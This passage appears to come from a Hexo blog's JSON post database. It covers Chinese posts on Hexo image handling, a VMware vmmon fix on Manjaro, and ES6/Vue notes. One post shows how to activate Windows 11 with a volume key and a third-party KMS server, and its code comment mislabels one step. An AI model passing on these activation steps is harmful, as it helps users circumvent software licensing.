title=\"插入图片\"></a>插入图片</h1><ol>\n<li>绝对引用<ul>\n<li>少量使用图片时可用此方法，将图片文件放入 <code>your_blog/public/images</code> 文件夹下，使用 <code>![picture](/public/images/picture.jpg)</code> 方式直接引用。</li>\n<li>存在问题：图片管理麻烦，删除文章时图片仍在，引用关系混乱</li>\n</ul>\n</li>\n<li>相对引用<ul>\n<li>在 <code>your_blog/_config.yml</code> 文件中配置 <code>post_asset_folder: true</code> ，新建文章的时候建立同名文件夹，将图片放入</li>\n<li>使用 <code>![picture](article/picture.jpg)</code> 引用图片</li>\n<li>优点：管理比较方便</li>\n</ul>\n</li>\n<li>CDN 或图床引用<ul>\n<li>所使用图片在网络图库上，直接使用图片链接即可，<code>![picture](https://website.com/picture.jpg)</code></li>\n<li>缺点：可能会失效，可自己使用图床网站上传自己的图片得到链接</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/60578464#:~:text=%E4%BD%BF%E7%94%A8%20Hexo%2BGitHub%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%EF%BC%88%E5%B0%8F%E7%99%BD%E5%90%91%EF%BC%89%201%20%E5%87%86%E5%A4%87%202%20%E8%BF%9E%E6%8E%A5%20Github....,Hexo%20%E5%88%B0%20GitHub%20Pages%206%20%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89....%207%20%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8\">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_41287260/article/details/97758641\">Hexo 新建标签、分类、归档等页面</a></li>\n<li><a href=\"https://www.cnblogs.com/hugochen1024/p/12570656.html\">Hexo 博客插入图片的方法</a></li>\n</ul>"},{"title":"Linux解决VMware问题","date":"2021-08-26T13:00:00.000Z","_content":"\n我在 Manjaro 升级 linux 内核后启动虚拟机突然报找不到 vmmon 模块错误，大致如下：\n\n<!--more-->\n\n```bash\ncould not open /dev/ vmmon，Please make sure that the kernel module `vmmon’ is loaded.\n```\n\n大部分回答说的都是执行以下命令：\n\n```bash\nsudo vmware-modconfig --console --install-all\n```\n\n但我执行后却报找不到文件\n\n```bash\n[AppLoader] GLib does not have GSettings support.\nsh: line 1: /usr/lib/systemd/scripts/vmware: No such file or directory\nUnable to stop services\n```\n\n还有人说执行：\n\n```bash\n/etc/init.d/vmware start\n```\n\n同样报错：\n\n```bash\nno such file or directory: /etc/init.d/vmware\n```\n\n也试了重装 VMware，还是一样。\n\n最后在回答中看到有这三条命令，试了一下，问题终于解决。\n\n```bash\nsudo modprobe -v vmmon\n\nsudo modprobe -v vmnet\n\nsudo vmware-networks --start\n```\n\n# 参考文章\n\n[Install VMware : Could not open /dev/vmmon: No such file or directory. Please make sure that the kernel module `vmmon' is loaded [closed]](https://stackoverflow.com/questions/49205162/install-vmware-could-not-open-dev-vmmon-no-such-file-or-directory-please-ma)\n","source":"_posts/2021/08/Linux解决VMware问题.md","raw":"---\ntitle: Linux解决VMware问题\ndate: 2021-08-26 21:00:00\ntags:\n  - 配置\n  - Linux\ncategories:\n  - 配置\n  - Linux\n---\n\n我在 Manjaro 升级 linux 内核后启动虚拟机突然报找不到 vmmon 模块错误，大致如下：\n\n<!--more-->\n\n```bash\ncould not open /dev/ vmmon，Please make sure that the kernel module `vmmon’ is loaded.\n```\n\n大部分回答说的都是执行以下命令：\n\n```bash\nsudo vmware-modconfig --console --install-all\n```\n\n但我执行后却报找不到文件\n\n```bash\n[AppLoader] GLib does not have GSettings support.\nsh: line 1: /usr/lib/systemd/scripts/vmware: No such file or directory\nUnable to stop services\n```\n\n还有人说执行：\n\n```bash\n/etc/init.d/vmware start\n```\n\n同样报错：\n\n```bash\nno such file or directory: /etc/init.d/vmware\n```\n\n也试了重装 VMware，还是一样。\n\n最后在回答中看到有这三条命令，试了一下，问题终于解决。\n\n```bash\nsudo modprobe -v vmmon\n\nsudo modprobe -v vmnet\n\nsudo vmware-networks --start\n```\n\n# 参考文章\n\n[Install VMware : Could not open /dev/vmmon: No such file or directory. Please make sure that the kernel module `vmmon' is loaded [closed]](https://stackoverflow.com/questions/49205162/install-vmware-could-not-open-dev-vmmon-no-such-file-or-directory-please-ma)\n","slug":"2021/08/Linux解决VMware问题","published":1,"updated":"2022-09-26T15:03:58.769Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj2001ezge39nmqhdtq","content":"<p>我在 Manjaro 升级 linux 内核后启动虚拟机突然报找不到 vmmon 模块错误，大致如下：</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">could not open /dev/ vmmon，Please make sure that the kernel module `vmmon’ is loaded.</span><br></pre></td></tr></table></figure>\n\n<p>大部分回答说的都是执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vmware-modconfig --console --install-all</span><br></pre></td></tr></table></figure>\n\n<p>但我执行后却报找不到文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[AppLoader] GLib does not have GSettings support.</span><br><span class=\"line\">sh: line 1: /usr/lib/systemd/scripts/vmware: No such file or directory</span><br><span class=\"line\">Unable to stop services</span><br></pre></td></tr></table></figure>\n\n<p>还有人说执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/vmware start</span><br></pre></td></tr></table></figure>\n\n<p>同样报错：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">no such file or directory: /etc/init.d/vmware</span><br></pre></td></tr></table></figure>\n\n<p>也试了重装 VMware，还是一样。</p>\n<p>最后在回答中看到有这三条命令，试了一下，问题终于解决。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo modprobe -v vmmon</span><br><span class=\"line\"></span><br><span class=\"line\">sudo modprobe -v vmnet</span><br><span class=\"line\"></span><br><span class=\"line\">sudo vmware-networks --start</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p>[Install VMware : Could not open &#x2F;dev&#x2F;vmmon: No such file or directory. Please make sure that the kernel module &#96;vmmon’ is loaded [closed]](<a href=\"https://stackoverflow.com/questions/49205162/install-vmware-could-not-open-dev-vmmon-no-such-file-or-directory-please-ma\">https://stackoverflow.com/questions/49205162/install-vmware-could-not-open-dev-vmmon-no-such-file-or-directory-please-ma</a>)</p>\n","site":{"data":{}},"excerpt":"<p>我在 Manjaro 升级 linux 内核后启动虚拟机突然报找不到 vmmon 模块错误，大致如下：</p>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">could not open /dev/ vmmon，Please make sure that the kernel module `vmmon’ is loaded.</span><br></pre></td></tr></table></figure>\n\n<p>大部分回答说的都是执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vmware-modconfig --console --install-all</span><br></pre></td></tr></table></figure>\n\n<p>但我执行后却报找不到文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[AppLoader] GLib does not have GSettings support.</span><br><span class=\"line\">sh: line 1: /usr/lib/systemd/scripts/vmware: No such file or directory</span><br><span class=\"line\">Unable to stop services</span><br></pre></td></tr></table></figure>\n\n<p>还有人说执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/vmware start</span><br></pre></td></tr></table></figure>\n\n<p>同样报错：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">no such file or directory: /etc/init.d/vmware</span><br></pre></td></tr></table></figure>\n\n<p>也试了重装 VMware，还是一样。</p>\n<p>最后在回答中看到有这三条命令，试了一下，问题终于解决。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo modprobe -v vmmon</span><br><span class=\"line\"></span><br><span class=\"line\">sudo modprobe -v vmnet</span><br><span class=\"line\"></span><br><span class=\"line\">sudo vmware-networks --start</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p>[Install VMware : Could not open &#x2F;dev&#x2F;vmmon: No such file or directory. Please make sure that the kernel module &#96;vmmon’ is loaded [closed]](<a href=\"https://stackoverflow.com/questions/49205162/install-vmware-could-not-open-dev-vmmon-no-such-file-or-directory-please-ma\">https://stackoverflow.com/questions/49205162/install-vmware-could-not-open-dev-vmmon-no-such-file-or-directory-please-ma</a>)</p>"},{"title":"Hexo 本地图片显示问题","date":"2021-08-21T12:30:00.000Z","_content":"\n# 前言\n\n在之前的博客描述中我提到了使用本地图片的方法（第二种），但实际应用还是无法显示，所以在网上搜索得到新的解决方案(详见参考文章)\n\n<!--more-->\n\n# 解决方案\n\n1. 确认 `hexo_project/_config.yml` 中配置好 `post_asset_folder: true`\n2. 在 `hexo_project` 目录执行如下命令下载插件\n\n   ```bash\n   npm install https://github.com/CodeFalling/hexo-asset-image --save\n   ```\n\n3. 假设文章目录中有如下结构\n\n   ```bash\n   # folder\n   your_post\n   |-picture.jpg\n   # article\n   your_post.md\n   ```\n\n   在 `your_post.md` 中使用 `![pic](your_post/picture.jpg)` 插入图片，编译生成的文章目录结构会是\n\n   ```bash\n   public/year/month/date/your_post\n   |-picture.jpg\n   |-index.html\n   ```\n\n   同时 index.html 中的图片路径会修改为 `<img src=\"/year/month/date/your_post/picture.jpg\" alt=\"pic\">` 而不是写 markdown 时的 `<img src=\"your_post/picture.jpg\" alt=\"pic\">` 路径。\n\n   问题解决。\n\n# 参考文章\n\n[在 hexo 中无痛使用本地图片](https://www.cnblogs.com/lmf-techniques/articles/6911051.html)\n","source":"_posts/2021/08/hexo本地图片显示问题.md","raw":"---\ntitle: Hexo 本地图片显示问题\ndate: 2021-08-21 20:30:00\ntags:\n  - 博客\ncategories:\n  - 博客\n  - Hexo\n---\n\n# 前言\n\n在之前的博客描述中我提到了使用本地图片的方法（第二种），但实际应用还是无法显示，所以在网上搜索得到新的解决方案(详见参考文章)\n\n<!--more-->\n\n# 解决方案\n\n1. 确认 `hexo_project/_config.yml` 中配置好 `post_asset_folder: true`\n2. 在 `hexo_project` 目录执行如下命令下载插件\n\n   ```bash\n   npm install https://github.com/CodeFalling/hexo-asset-image --save\n   ```\n\n3. 假设文章目录中有如下结构\n\n   ```bash\n   # folder\n   your_post\n   |-picture.jpg\n   # article\n   your_post.md\n   ```\n\n   在 `your_post.md` 中使用 `![pic](your_post/picture.jpg)` 插入图片，编译生成的文章目录结构会是\n\n   ```bash\n   public/year/month/date/your_post\n   |-picture.jpg\n   |-index.html\n   ```\n\n   同时 index.html 中的图片路径会修改为 `<img src=\"/year/month/date/your_post/picture.jpg\" alt=\"pic\">` 而不是写 markdown 时的 `<img src=\"your_post/picture.jpg\" alt=\"pic\">` 路径。\n\n   问题解决。\n\n# 参考文章\n\n[在 hexo 中无痛使用本地图片](https://www.cnblogs.com/lmf-techniques/articles/6911051.html)\n","slug":"2021/08/hexo本地图片显示问题","published":1,"updated":"2022-07-23T14:41:42.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj3001izge31z351pfr","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在之前的博客描述中我提到了使用本地图片的方法（第二种），但实际应用还是无法显示，所以在网上搜索得到新的解决方案(详见参考文章)</p>\n<span id=\"more\"></span>\n\n<h1 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h1><ol>\n<li><p>确认 <code>hexo_project/_config.yml</code> 中配置好 <code>post_asset_folder: true</code></p>\n</li>\n<li><p>在 <code>hexo_project</code> 目录执行如下命令下载插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>假设文章目录中有如下结构</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># folder</span></span><br><span class=\"line\">your_post</span><br><span class=\"line\">|-picture.jpg</span><br><span class=\"line\"><span class=\"comment\"># article</span></span><br><span class=\"line\">your_post.md</span><br></pre></td></tr></table></figure>\n\n<p>在 <code>your_post.md</code> 中使用 <code>![pic](your_post/picture.jpg)</code> 插入图片，编译生成的文章目录结构会是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public/year/month/date/your_post</span><br><span class=\"line\">|-picture.jpg</span><br><span class=\"line\">|-index.html</span><br></pre></td></tr></table></figure>\n\n<p>同时 index.html 中的图片路径会修改为 <code>&lt;img src=&quot;/year/month/date/your_post/picture.jpg&quot; alt=&quot;pic&quot;&gt;</code> 而不是写 markdown 时的 <code>&lt;img src=&quot;your_post/picture.jpg&quot; alt=&quot;pic&quot;&gt;</code> 路径。</p>\n<p>问题解决。</p>\n</li>\n</ol>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://www.cnblogs.com/lmf-techniques/articles/6911051.html\">在 hexo 中无痛使用本地图片</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在之前的博客描述中我提到了使用本地图片的方法（第二种），但实际应用还是无法显示，所以在网上搜索得到新的解决方案(详见参考文章)</p>","more":"<h1 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h1><ol>\n<li><p>确认 <code>hexo_project/_config.yml</code> 中配置好 <code>post_asset_folder: true</code></p>\n</li>\n<li><p>在 <code>hexo_project</code> 目录执行如下命令下载插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>假设文章目录中有如下结构</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># folder</span></span><br><span class=\"line\">your_post</span><br><span class=\"line\">|-picture.jpg</span><br><span class=\"line\"><span class=\"comment\"># article</span></span><br><span class=\"line\">your_post.md</span><br></pre></td></tr></table></figure>\n\n<p>在 <code>your_post.md</code> 中使用 <code>![pic](your_post/picture.jpg)</code> 插入图片，编译生成的文章目录结构会是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public/year/month/date/your_post</span><br><span class=\"line\">|-picture.jpg</span><br><span class=\"line\">|-index.html</span><br></pre></td></tr></table></figure>\n\n<p>同时 index.html 中的图片路径会修改为 <code>&lt;img src=&quot;/year/month/date/your_post/picture.jpg&quot; alt=&quot;pic&quot;&gt;</code> 而不是写 markdown 时的 <code>&lt;img src=&quot;your_post/picture.jpg&quot; alt=&quot;pic&quot;&gt;</code> 路径。</p>\n<p>问题解决。</p>\n</li>\n</ol>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://www.cnblogs.com/lmf-techniques/articles/6911051.html\">在 hexo 中无痛使用本地图片</a></p>"},{"title":"Windows11 激活","date":"2021-08-30T13:50:00.000Z","_content":"\n装了 Windows11 的测试版，一直提示激活。找了半天的激活码，没一个能用的，最后找到一个教程。\n\n<!--more-->\n\n# 激活\n\n在 cmd 命令行依次执行以下命令（管理员模式）：\n\n```powershell\n// 安装产品密钥\nslmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX\n// 更改计算机名称\nslmgr /skms kms.03k.org\n// 激活\nslmgr /ato\n```\n\n也可创建一个 bat 文件，内容就是上面代码，以管理员身份运行。\n\n最后激活成功。\n\n# 参考文章\n\n[教大家怎么永久激活 win11 专业版](https://koudaipe.com/win11/23454.html)\n","source":"_posts/2021/08/Windows11激活.md","raw":"---\ntitle: Windows11 激活\ndate: 2021-08-30 21:50:00\ntags:\n  - 配置\n  - Windows\ncategories:\n  - 配置\n  - Windows\n---\n\n装了 Windows11 的测试版，一直提示激活。找了半天的激活码，没一个能用的，最后找到一个教程。\n\n<!--more-->\n\n# 激活\n\n在 cmd 命令行依次执行以下命令（管理员模式）：\n\n```powershell\n// 安装产品密钥\nslmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX\n// 更改计算机名称\nslmgr /skms kms.03k.org\n// 激活\nslmgr /ato\n```\n\n也可创建一个 bat 文件，内容就是上面代码，以管理员身份运行。\n\n最后激活成功。\n\n# 参考文章\n\n[教大家怎么永久激活 win11 专业版](https://koudaipe.com/win11/23454.html)\n","slug":"2021/08/Windows11激活","published":1,"updated":"2022-09-26T15:03:40.219Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj3001lzge32mjeb7sr","content":"<p>装了 Windows11 的测试版，一直提示激活。找了半天的激活码，没一个能用的，最后找到一个教程。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"激活\"><a href=\"#激活\" class=\"headerlink\" title=\"激活\"></a>激活</h1><p>在 cmd 命令行依次执行以下命令（管理员模式）：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 安装产品密钥</span><br><span class=\"line\">slmgr /ipk W269N<span class=\"literal\">-WFGWX-YVC9B-4J6C9-T83GX</span></span><br><span class=\"line\">// 更改计算机名称</span><br><span class=\"line\">slmgr /skms kms.<span class=\"number\">03</span>k.org</span><br><span class=\"line\">// 激活</span><br><span class=\"line\">slmgr /ato</span><br></pre></td></tr></table></figure>\n\n<p>也可创建一个 bat 文件，内容就是上面代码，以管理员身份运行。</p>\n<p>最后激活成功。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://koudaipe.com/win11/23454.html\">教大家怎么永久激活 win11 专业版</a></p>\n","site":{"data":{}},"excerpt":"<p>装了 Windows11 的测试版，一直提示激活。找了半天的激活码，没一个能用的，最后找到一个教程。</p>","more":"<h1 id=\"激活\"><a href=\"#激活\" class=\"headerlink\" title=\"激活\"></a>激活</h1><p>在 cmd 命令行依次执行以下命令（管理员模式）：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 安装产品密钥</span><br><span class=\"line\">slmgr /ipk W269N<span class=\"literal\">-WFGWX-YVC9B-4J6C9-T83GX</span></span><br><span class=\"line\">// 更改计算机名称</span><br><span class=\"line\">slmgr /skms kms.<span class=\"number\">03</span>k.org</span><br><span class=\"line\">// 激活</span><br><span class=\"line\">slmgr /ato</span><br></pre></td></tr></table></figure>\n\n<p>也可创建一个 bat 文件，内容就是上面代码，以管理员身份运行。</p>\n<p>最后激活成功。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://koudaipe.com/win11/23454.html\">教大家怎么永久激活 win11 专业版</a></p>"},{"title":"TypeScript学习记录","date":"2023-10-20T01:00:00.000Z","_content":"\n2023 Vue 前端开发技术与实战培训\n\n<!-- more -->\n\n# 准备知识点\n\n## true or false?\n\n```javascript\nconsole.log(3 && 4) // 4\nconsole.log(3 || 4) // 3\n```\n\n条件为 true 时返回最后一次的真实值。\n\n## ES6 的 OOP 要点\n\n- 没有公有、私有属性。\n- 有属于对象的和属于类的属性。常规的函数是属于类的，this 是属于对象的。\n- ES6 是没有类型的，所以类函数也没有返回值。\n- 继承：子类构造函数内，需要先调用父类的构造函数。\n\n## ES6 部分特性\n\n1. 字面量：\n2. 字符串模版：反引号\n\n```javascript\nlet n = 'aaa'\nconsole.log(`your result is ${3 || 4}, your name is ${n}`)\n```\n\n3. 解构：对数组或者 JSON 拆解，让代码更简洁\n\n```javascript\nlet info = ['zhang', 18]\n// let name = info[0]\n// let age = info[1]\nlet [name, age] = info\n\nlet info2 = { name: 'zhang', age: 18 }\n// let name = info2.name\nlet { name, age } = info2\n```\n\n4. 默认值\n\n```javascript\nfunction hello(name = 'es6 default') {\n  // let name = name || 'traditional default';\n  console.log(`hello ${name}`)\n}\n```\n\n5. 不定参数：形参\n\n```javascript\nfunction add(a, ...x) {\n  return x.reduce((accumulator, currentVal) => {\n    return accumulator + currentVal\n  })\n}\nconsole.log(add(1, 2, 3, 4, 5, 6)) // 20\n```\n\n6. 拓展参数：实参\n\n```javascript\nfunction sayHello(name1, name2, name3) {\n  console.log(`hello ${name1}, hello ${name2}, hello ${name3}`)\n}\nlet names = ['zhangsan', 'lisi', 'wangwu']\nsayHello(...names)\n```\n\n7. Proxies\n\n8. Promise\n\n> 状态：\n>\n> 成功：resolved；\n> 失败：rejected；\n> 进行中：pending；\n>\n> 状态的转化：\n>\n> pending -> resolved，使用 resolve()；\n> pending -> rejected，使用 reject()；\n\n```javascript\nfunction cook() {\n  console.log(`cook food started`)\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      console.log(`cook food finished`)\n      resolve('cooked-food')\n      // reject('boom here')\n    }, 2000)\n  })\n}\n\nfunction eat(food) {\n  console.log(`start eating ${food}`)\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      console.log(`stop eating ${food}`)\n      resolve('empty-dishes')\n    }, 2000)\n  })\n}\n\nfunction wash(dishes) {\n  console.log(`start washing ${dishes}`)\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      console.log(`stop washing ${dishes}`)\n      resolve('finished')\n    }, 2000)\n  })\n}\n\ncook()\n  .then((data) => eat(data))\n  .then((data) => wash(data))\n  .then((data) => console.log(`result: ${data}`))\n  .catch((error) => console.log(`error: ${error}`))\n```\n\n`async`：加在 function 前可以自动返回 promise 对象；\n`await`：加在调用的 promise function 前可以阻塞异步请求，变为顺序执行；\n\n```javascript\nasync function func1() {\n  return 'func1 return'\n}\nasync function func2() {\n  // await func1().then((data) => console.log(data));\n  return 'func2 return'\n}\n\nfunc2().then((data) => console.log(data))\n\nPromise.all([func1(), func2()]).then((data) => {\n  console.log(data)\n})\n```\n\n# Vue\n\n## 特殊变量\n\n1. 观察变量\n\n```javascript\nwatch: {\n  a: (newVal) => {\n    console.log(`watch:${newVal}`)\n  }\n}\n```\n\n2. 实时计算变量\n\n- 不能在 data 里声明\n- 必须在 computed 里面声明\n- 需要在 view 里面使用\n\n```javascript\ncomputed: {\n}\n```\n\n## router\n\n- 定义好组件（用户页）\n- 把用户页和路由地址（Path）一一对应，这个对应的管理工作就是 router\n- 再把 router 配置到 vue 对象上，一起挂载到 DOM 对象\n- view 需要有 router-view 及 router-link\n\n## vuex\n\n- 声明全局状态\n- 读：\n  - getter\n  - mapper 映射+Computed\n- 写：\n  - dispatch(action)，组件上使用\n  - action(commit) -> 允许异步\n  - mutation -> 同步，修改状态\n\n## vue 组件生命周期\n\n- 初始化阶段：beforeCreate、created、beforeMount、mounted\n- 运行中：beforeUpdate、updated\n- 销毁阶段：beforeDestroy、destroyed\n\n## vue3\n\n1. 响应式数据声明\n\n- ref，声明基础数据类型\n- reactive，声明复杂数据类型\n\n2. setup\n","source":"_posts/2023/10/Vue前端培训.md","raw":"---\ntitle: TypeScript学习记录\ndate: 2023-10-20 09:00:00\ntags:\n  - 前端\n  - Vue\ncategories:\n  - 前端\n  - Vue\n---\n\n2023 Vue 前端开发技术与实战培训\n\n<!-- more -->\n\n# 准备知识点\n\n## true or false?\n\n```javascript\nconsole.log(3 && 4) // 4\nconsole.log(3 || 4) // 3\n```\n\n条件为 true 时返回最后一次的真实值。\n\n## ES6 的 OOP 要点\n\n- 没有公有、私有属性。\n- 有属于对象的和属于类的属性。常规的函数是属于类的，this 是属于对象的。\n- ES6 是没有类型的，所以类函数也没有返回值。\n- 继承：子类构造函数内，需要先调用父类的构造函数。\n\n## ES6 部分特性\n\n1. 字面量：\n2. 字符串模版：反引号\n\n```javascript\nlet n = 'aaa'\nconsole.log(`your result is ${3 || 4}, your name is ${n}`)\n```\n\n3. 解构：对数组或者 JSON 拆解，让代码更简洁\n\n```javascript\nlet info = ['zhang', 18]\n// let name = info[0]\n// let age = info[1]\nlet [name, age] = info\n\nlet info2 = { name: 'zhang', age: 18 }\n// let name = info2.name\nlet { name, age } = info2\n```\n\n4. 默认值\n\n```javascript\nfunction hello(name = 'es6 default') {\n  // let name = name || 'traditional default';\n  console.log(`hello ${name}`)\n}\n```\n\n5. 不定参数：形参\n\n```javascript\nfunction add(a, ...x) {\n  return x.reduce((accumulator, currentVal) => {\n    return accumulator + currentVal\n  })\n}\nconsole.log(add(1, 2, 3, 4, 5, 6)) // 20\n```\n\n6. 拓展参数：实参\n\n```javascript\nfunction sayHello(name1, name2, name3) {\n  console.log(`hello ${name1}, hello ${name2}, hello ${name3}`)\n}\nlet names = ['zhangsan', 'lisi', 'wangwu']\nsayHello(...names)\n```\n\n7. Proxies\n\n8. Promise\n\n> 状态：\n>\n> 成功：resolved；\n> 失败：rejected；\n> 进行中：pending；\n>\n> 状态的转化：\n>\n> pending -> resolved，使用 resolve()；\n> pending -> rejected，使用 reject()；\n\n```javascript\nfunction cook() {\n  console.log(`cook food started`)\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      console.log(`cook food finished`)\n      resolve('cooked-food')\n      // reject('boom here')\n    }, 2000)\n  })\n}\n\nfunction eat(food) {\n  console.log(`start eating ${food}`)\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      console.log(`stop eating ${food}`)\n      resolve('empty-dishes')\n    }, 2000)\n  })\n}\n\nfunction wash(dishes) {\n  console.log(`start washing ${dishes}`)\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      console.log(`stop washing ${dishes}`)\n      resolve('finished')\n    }, 2000)\n  })\n}\n\ncook()\n  .then((data) => eat(data))\n  .then((data) => wash(data))\n  .then((data) => console.log(`result: ${data}`))\n  .catch((error) => console.log(`error: ${error}`))\n```\n\n`async`：加在 function 前可以自动返回 promise 对象；\n`await`：加在调用的 promise function 前可以阻塞异步请求，变为顺序执行；\n\n```javascript\nasync function func1() {\n  return 'func1 return'\n}\nasync function func2() {\n  // await func1().then((data) => console.log(data));\n  return 'func2 return'\n}\n\nfunc2().then((data) => console.log(data))\n\nPromise.all([func1(), func2()]).then((data) => {\n  console.log(data)\n})\n```\n\n# Vue\n\n## 特殊变量\n\n1. 观察变量\n\n```javascript\nwatch: {\n  a: (newVal) => {\n    console.log(`watch:${newVal}`)\n  }\n}\n```\n\n2. 实时计算变量\n\n- 不能在 data 里声明\n- 必须在 computed 里面声明\n- 需要在 view 里面使用\n\n```javascript\ncomputed: {\n}\n```\n\n## router\n\n- 定义好组件（用户页）\n- 把用户页和路由地址（Path）一一对应，这个对应的管理工作就是 router\n- 再把 router 配置到 vue 对象上，一起挂载到 DOM 对象\n- view 需要有 router-view 及 router-link\n\n## vuex\n\n- 声明全局状态\n- 读：\n  - getter\n  - mapper 映射+Computed\n- 写：\n  